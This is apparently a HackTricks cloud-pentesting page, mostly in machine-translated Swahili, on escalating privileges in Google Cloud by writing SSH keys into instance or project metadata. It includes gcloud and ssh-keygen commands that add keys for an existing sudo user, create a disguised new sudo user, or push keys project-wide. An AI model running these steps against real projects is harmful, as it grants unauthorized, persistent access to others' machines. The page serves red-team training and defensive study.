# GCP - Add Custom SSH Metadata

## GCP - Add Custom SSH Metadata

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Modifying the metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Mabadiliko ya metadata kwenye mfano yanaweza kusababisha **hatari kubwa za usalama ikiwa mshambuliaji atapata ruhusa zinazohitajika**.

#### **Incorporation of SSH Keys into Custom Metadata**

Katika GCP, **mifumo ya Linux** mara nyingi inatekeleza skripti kutoka [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Sehemu muhimu ya hii ni [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), ambayo imeundwa ili **kuangalia mara kwa mara** mwisho wa metadata ya mfano kwa **sasisho za funguo za umma za SSH zilizoidhinishwa**.

Hivyo, ikiwa mshambuliaji anaweza kubadilisha metadata ya kawaida, anaweza kufanya daemon ipate funguo mpya za umma, ambazo zitawekwa na **kuunganishwa kwenye mfumo wa ndani**. Funguo hiyo itaongezwa kwenye faili ya `~/.ssh/authorized_keys` ya **mtumiaji aliye tayari au labda kuunda mtumiaji mpya mwenye ruhusa za `sudo`**, kulingana na muundo wa funguo. Na mshambuliaji ataweza kuathiri mwenyeji.

#### **Add SSH key to existing privileged user**

1. **Examine Existing SSH Keys on the Instance:**
*   Tekeleza amri ya kuelezea mfano na metadata yake ili kupata funguo za SSH zilizopo. Sehemu inayohusiana katika matokeo itakuwa chini ya `metadata`, hasa funguo ya `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* Angalia muundo wa funguo za SSH: jina la mtumiaji linatangulia funguo, likitenganishwa na koloni.
2. **Prepare a Text File for SSH Key Metadata:**
* Hifadhi maelezo ya majina ya watumiaji na funguo zao za SSH zinazohusiana kwenye faili ya maandiko inayoitwa `meta.txt`. Hii ni muhimu ili kuhifadhi funguo zilizopo wakati wa kuongeza mpya.
3. **Generate a New SSH Key for the Target User (`alice` in this example):**
*   Tumia amri ya `ssh-keygen` kuzalisha funguo mpya ya SSH, kuhakikisha kuwa uwanja wa maoni (`-C`) unalingana na jina la mtumiaji wa lengo.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* Ongeza funguo mpya ya umma kwenye `meta.txt`, ukifanana na muundo ulio katika metadata ya mfano.
4. **Update the Instance's SSH Key Metadata:**
*   Tumia metadata ya funguo ya SSH iliyosasishwa kwenye mfano kwa kutumia amri ya `gcloud compute instances add-metadata`.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Access the Instance Using the New SSH Key:**
*   Unganisha kwenye mfano kwa SSH ukitumia funguo mpya, ukipata shell katika muktadha wa mtumiaji wa lengo (`alice` katika mfano huu).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Create a new privileged user and add a SSH key**

Ikiwa hakuna mtumiaji wa kuvutia anapatikana, inawezekana kuunda mpya ambayo itapewa ruhusa za `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### SSH keys at project level <a href="#sshing-around" id="sshing-around"></a>

Inawezekana kupanua ufikiaji wa SSH kwa Mashine nyingi za Kijijini (VMs) katika mazingira ya wingu kwa **kutumia funguo za SSH katika kiwango cha mradi**. Njia hii inaruhusu ufikiaji wa SSH kwa mfano wowote ndani ya mradi ambao haujazuia wazi wazi funguo za SSH za mradi. Hapa kuna mwongozo wa muhtasari:

1. **Tumia Funguo za SSH katika Kiwango cha Mradi:**
*   Tumia amri `gcloud compute project-info add-metadata` kuongeza funguo za SSH kutoka `meta.txt` kwenye metadata ya mradi. Kitendo hiki kinahakikisha kwamba funguo za SSH zinatambuliwa katika VMs zote ndani ya mradi, isipokuwa VM ina chaguo la "Block project-wide SSH keys" limewezeshwa.

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **SSH kwenye Mifano kwa Kutumia Funguo za Mradi:**
* Kwa funguo za SSH za mradi zilizowekwa, unaweza SSH kwenye mfano wowote ndani ya mradi. Mifano ambayo haizuia funguo za mradi itakubali funguo za SSH, ikitoa ufikiaji.
* Njia moja ya moja ya SSH kwenye mfano ni kutumia amri `gcloud compute ssh [INSTANCE]`. Amri hii inatumia jina lako la mtumiaji wa sasa na funguo za SSH zilizowekwa katika kiwango cha mradi kujaribu ufikiaji.

## References

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
